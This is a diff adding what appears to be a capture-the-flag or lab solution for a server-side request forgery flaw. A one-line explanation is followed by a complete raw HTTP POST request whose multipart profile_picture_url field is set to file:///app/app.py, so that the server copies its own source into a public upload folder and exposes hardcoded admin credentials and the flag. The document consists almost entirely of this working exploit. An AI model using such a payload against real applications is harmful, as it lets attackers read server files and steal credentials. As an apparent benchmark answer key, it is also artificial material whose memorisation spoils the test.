@@ -1,0 +1,9 @@
+# SSRF via profile_picture_url with file:// protocol reads arbitrary local files. urllib.request.urlretrieve() has no protocol filtering. File saved to /static/uploads/<filename> and publicly accessible. Read /app/app.py to get hardcoded admin credentials and flag.
+
+POST /profile HTTP/1.1
+Host: 172.17.0.1:53595
+Cookie: session=<attacker-session-cookie>
+Content-Type: multipart/form-data
+Content-Length: 366
+
+--boundary\r\nContent-Disposition: form-data; name=\"first_name\"\r\n\r\nTest\r\n--boundary\r\nContent-Disposition: form-data; name=\"last_name\"\r\n\r\nUser\r\n--boundary\r\nContent-Disposition: form-data; name=\"email\"\r\n\r\nattacker@test.com\r\n--boundary\r\nContent-Disposition: form-data; name=\"profile_picture_url\"\r\n\r\nfile:///app/app.py\r\n--boundary--
